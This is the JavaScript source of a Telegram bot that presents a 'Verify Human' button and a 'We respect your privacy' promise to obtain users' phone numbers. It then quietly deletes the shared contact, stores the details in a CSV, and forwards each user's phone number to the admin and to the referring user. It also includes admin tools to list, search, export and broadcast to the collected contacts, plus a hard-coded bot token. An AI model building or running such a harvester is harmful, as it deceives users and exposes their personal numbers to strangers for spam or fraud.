/**
 * contact_saver_bot.js
 * Node.js / node-telegram-bot-api version of a consent-first contact saver bot.
 *
 */

const fs = require('fs');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const csv = require('csv-parser');
const stringify = require('csv-stringify').stringify;
const moment = require('moment-timezone');

const express = require("express");
const app = express();

app.get("/", (req, res) => {
  res.send("Bot is running!");
});

app.listen(process.env.PORT || 3000, () => {
  console.log("Server ready!");
});



/////////////////////////////////////////////////////
// CONFIG
const BOT_TOKEN = '8332737651:AAGifKj51tf87P1Hcp-UsyjS4tSJMyVhWcc';
const ADMIN_ID = 7115841620;
const CONTACT_FILE = path.join(__dirname, 'contacts.csv');
/////////////////////////////////////////////////////

const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const referralLinks = {};     // mapping: newUserId -> referrerId (string/number)
let contactLogs = [];

// ensure contacts file exists with header
function ensureContactFile() {
  if (!fs.existsSync(CONTACT_FILE)) {
    const header = ['Name', 'Phone', 'Username', 'Chat ID', 'Day', 'Time', 'Referrer ID'];
    fs.writeFileSync(CONTACT_FILE, header.join(',') + '\n', 'utf8');
  }
}

// load contacts
function loadContacts() {
  contactLogs = [];
  if (!fs.existsSync(CONTACT_FILE)) return;

  const rows = [];
  fs.createReadStream(CONTACT_FILE)
    .pipe(csv({ headers: true }))
    .on('data', (r) => rows.push(r))
    .on('end', () => { contactLogs = rows; })
    .on('error', () => { });
}

// check if exists
function contactExists(id) {
  return contactLogs.some(r => String(r["Chat ID"]) === String(id));
}

function saveContact(obj) {
  return new Promise((resolve, reject) => {
    stringify([[obj.name, obj.phone, obj.username, obj.chatId, obj.day, obj.time, obj.referrer || 'None']], (err, out) => {
      if (err) return reject(err);
      fs.appendFile(CONTACT_FILE, out, 'utf8', (err) => {
        if (err) return reject(err);
        contactLogs.push({
          "Name": obj.name,
          "Phone": obj.phone,
          "Username": obj.username,
          "Chat ID": obj.chatId,
          "Day": obj.day,
          "Time": obj.time,
          "Referrer ID": obj.referrer || 'None'
        });
        resolve();
      });
    });
  });
}

function safeDelete(chat, msgId, delay = 1000) {
  setTimeout(() => {
    bot.deleteMessage(chat, msgId).catch(() => { });
  }, delay);
}

ensureContactFile();
loadContacts();

// === START HANDLER ===
bot.onText(/^\/start(?:\s+(.+))?/, async (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const id = msg.from.id;

    const arg = match && match[1] ? match[1].trim() : null;
    let refId = null;
    if (arg && arg.startsWith("ref_")) {
      refId = arg.replace("ref_", "");
      // store mapping: this visitor (id) is referred by refId
      referralLinks[String(id)] = String(refId);
    }

    // === ADMIN ===
    if (id === ADMIN_ID) {
      const opts = {
        reply_markup: {

          keyboard: [
            ['📋 All Contacts'],
            ['📤 Get Your Link'],
            ['🔍 Check Details'],
            ['📢 Broadcast Message'],
            ['📦 Export CSV']   // <-- NEW EXPORT BUTTON
          ],

          resize_keyboard: true
        }
      };
      return bot.sendMessage(chatId, "👑Welcome Admin G👑", opts);
    }

    // === USER ALREADY VERIFIED ===
    if (contactExists(id)) {
      const opts = {
        reply_markup: {
          keyboard: [[{ text: '📤 Get Your Link' }]],
          resize_keyboard: true
        }
      };
      return bot.sendMessage(chatId, "✅ Aapka already verified hai.", opts);
    }

    // NEW USER – ASK CONTACT
    const keyboard = {
      reply_markup: {
        keyboard: [[{ text: 'Verify Human✅', request_contact: true }]],
        resize_keyboard: true
      }
    };

    let text = "👋 *Welcome!* \n\nThis bot is made by danger to help you.\n";
    if (refId) text += `📨 Invite by user ID: \`${refId}\`\n\n`;

    text += "First📱Press *Verify Human✅*\n\nWe respect your privacy";

    bot.sendMessage(chatId, text, { parse_mode: "Markdown", ...keyboard });

  } catch (err) { console.error('Error in /start:', err); }
});

// === CONTACT HANDLER ===
bot.on("contact", async (msg) => {
  try {
    const chatId = msg.chat.id;
    const id = msg.from.id;

    // Try to remove the contact message quickly
    safeDelete(chatId, msg.message_id);

    if (contactExists(id)) {
      const opts = {
        reply_markup: {
          keyboard: [[{ text: '📤 Get Your Link' }]],
          resize_keyboard: true
        }
      };
      return bot.sendMessage(chatId, "ℹ️Already saved.", opts);
    }

    const time = moment().tz("Asia/Kolkata");
    const obj = {
      name: msg.from.first_name || "Unknown",
      phone: msg.contact.phone_number,
      username: msg.from.username ? `@${msg.from.username}` : "Not Available",
      chatId: String(id),
      day: time.format("dddd"),
      time: time.format("hh:mm A"),
      referrer: referralLinks[String(id)] || null
    };

    await saveContact(obj);

    // Confirmation to the new user
    await bot.sendMessage(chatId, "✅ Human verification successful!");

    // Notify admin
    const adminText =
      `📩 *New Contact:*\n` +
      `👤 TgName:👉${obj.name}\n` +
      `📱 PhoneNo:👉${obj.phone}\n` +
      `🔗 UserName:👉${obj.username}\n` +
      `🆔 UserID:👉${obj.chatId}\n` +
      `📅 ${obj.day} | 🕒 ${obj.time}\n` +
      `👥 Referred by: ${obj.referrer ? obj.referrer : 'None'}`;

    await bot.sendMessage(ADMIN_ID, adminText, { parse_mode: 'Markdown' });

    // === NEW FIX: Notify the referrer (if exists and not same as user) ===
    try {
      if (obj.referrer && String(obj.referrer) !== String(obj.chatId)) {
        // attempt to send notification to referrer
        await bot.sendMessage(
          obj.referrer,
          `🎉 *Someone used your referral link!*\n\n` +
          `👤 TgName:👉${obj.name}\n` +
          `📱 PhoneNo:👉${obj.phone}\n` +
          `🔗 UserName:👉${obj.username}\n` +
          `🆔 UserID:👉${obj.chatId}\n` +
          `♻️ ADMIN:👉@s1danger♻️`,
          { parse_mode: 'Markdown' }
        );
      }
    } catch (e) {
      // ignore errors (referrer may have blocked bot or privacy settings)
      // but keep server logs for debugging
      console.warn('Could not notify referrer:', e && e.message ? e.message : e);
    } finally {
      // remove mapping to avoid duplicate notifications later
      try { delete referralLinks[String(id)]; } catch (e) { }
    }

    // show invite link button
    const opts = {
      reply_markup: {
        keyboard: [[{ text: '📤 Get Your Link' }]],
        resize_keyboard: true
      }
    };
    await bot.sendMessage(chatId, "📤 Now you can generate your invite link.", opts);

  } catch (err) {
    console.error('Error handling contact:', err);
  }
});

// === GENERATE LINK ===
bot.onText(/📤 Get Your Link/, async (msg) => {
  try {
    const chatId = msg.chat.id;
    const id = msg.from.id;

    const me = await bot.getMe();
    const botUsername = me && me.username ? me.username : null;
    const link = `https://t.me/${botUsername || 'YourBot'}?start=ref_${id}`;

    const sent = await bot.sendMessage(
      chatId,
      `🔗 *Your Referral Link:*\n[${link}](${link})\n\n_This message will auto-delete in 30s._`,
      { parse_mode: "Markdown", disable_web_page_preview: true }
    );

    if (id !== ADMIN_ID) {
      setTimeout(() => bot.deleteMessage(chatId, sent.message_id).catch(() => { }), 30000);
    }

  } catch (err) { console.error('Error generating link:', err); }
});

// === ALL CONTACTS ===
bot.onText(/📋 All Contacts/, async (msg) => {
  if (msg.from.id !== ADMIN_ID) return;

  if (contactLogs.length === 0)
    return bot.sendMessage(msg.chat.id, "⚠️ No contacts found.");

  let text = `📋 *Total Contacts:* ${contactLogs.length}\n\n`;

  for (let i = 0; i < contactLogs.length; i++) {
    const r = contactLogs[i];

    text += `${i + 1}) *${r.Name}*\n📱 ${r.Phone}\n🔗 ${r.Username}\n🆔 ${r["Chat ID"]}\n📅 ${r.Day} | ${r.Time}\n👥 Ref: ${r["Referrer ID"]}\n\n`;

    if (text.length > 3500) {
      await bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
      text = "";
    }
  }

  if (text) await bot.sendMessage(msg.chat.id, text, { parse_mode: "Markdown" });
});

// === EXPORT CONTACTS CSV (ADMIN ONLY) ===
bot.onText(/📦 Export CSV/, async (msg) => {
  if (msg.from.id !== ADMIN_ID) return;

  try {
    if (!fs.existsSync(CONTACT_FILE)) {
      return bot.sendMessage(ADMIN_ID, "⚠️contacts.csv file missing.");
    }

    await bot.sendDocument(
      ADMIN_ID,
      CONTACT_FILE,
      {},
      { filename: "contacts_export.csv", contentType: "text/csv" }
    );

  } catch (err) {
    console.error("CSV export error:", err);
    bot.sendMessage(ADMIN_ID, "❌ Export failed.");
  }
});


// === CHECK DETAILS ===
bot.onText(/🔍 Check Details/, (msg) => {
  if (msg.from.id !== ADMIN_ID) return;

  bot.sendMessage(ADMIN_ID, "🆔 Send User ID, username or phone number:");

  const handler = async (m) => {
    if (m.from.id !== ADMIN_ID) return;

    const q = m.text.trim().replace("@", "").toLowerCase();
    let found = false;

    for (const r of contactLogs) {
      if (
        String(r["Chat ID"]) === q ||
        String(r["Phone"]).includes(q) ||
        String(r["Username"]).replace("@", "").toLowerCase().includes(q)
      ) {
        found = true;
        await bot.sendMessage(
          ADMIN_ID,
          `📇 *User Details:*\n👤 ${r.Name}\n📱 ${r.Phone}\n🔗 ${r.Username}\n🆔 ${r["Chat ID"]}`,
          { parse_mode: "Markdown" }
        );
      }
    }

    if (!found) await bot.sendMessage(ADMIN_ID, "❌ No record found.");

    bot.removeListener("message", handler);
  };

  bot.on("message", handler);
});





// =====================================================================
//                 📢  ADMIN BROADCAST SYSTEM (NEW)
// =====================================================================
let isBroadcastMode = false;

bot.onText(/📢 Broadcast Message/, (msg) => {
  if (msg.from.id !== ADMIN_ID) return;

  isBroadcastMode = true;
  bot.sendMessage(ADMIN_ID, "📝 Type the broadcast message:");
});

bot.on("message", async (msg) => {
  // Broadcast handler should only run when in broadcast mode and message from admin
  if (!isBroadcastMode) return;
  if (msg.from.id !== ADMIN_ID) return;
  if (!msg.text) return;

  isBroadcastMode = false;
  const message = msg.text;

  bot.sendMessage(ADMIN_ID, `📤 Sending broadcast to ${contactLogs.length} users...`);

  for (const r of contactLogs) {
    bot.sendMessage(r["Chat ID"], `📢 *Admin Broadcast:*\n${message}`, {
      parse_mode: "Markdown"
    }).catch(() => { });
  }

  bot.sendMessage(ADMIN_ID, "✅ Broadcast sent successfully.");
});

console.log("✨ Contact Saver Bot Running...");
